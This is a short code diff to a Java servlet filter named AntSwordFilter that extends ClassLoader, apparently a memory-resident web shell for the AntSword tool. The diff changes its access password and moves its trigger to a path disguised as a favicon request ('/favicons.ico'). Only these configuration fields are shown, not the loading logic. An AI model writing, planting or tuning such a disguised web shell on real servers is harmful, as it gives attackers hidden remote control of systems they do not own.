@@ -18,8 +18,8 @@ public final class AntSwordFilter extends ClassLoader implements Filter {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
-    public String Pwd = "pass1024";
-    public String path = "/favicondemo.ico";
+    public String Pwd = "favicon";
+    public String path = "/favicons.ico";
 
     public AntSwordFilter() {
     }
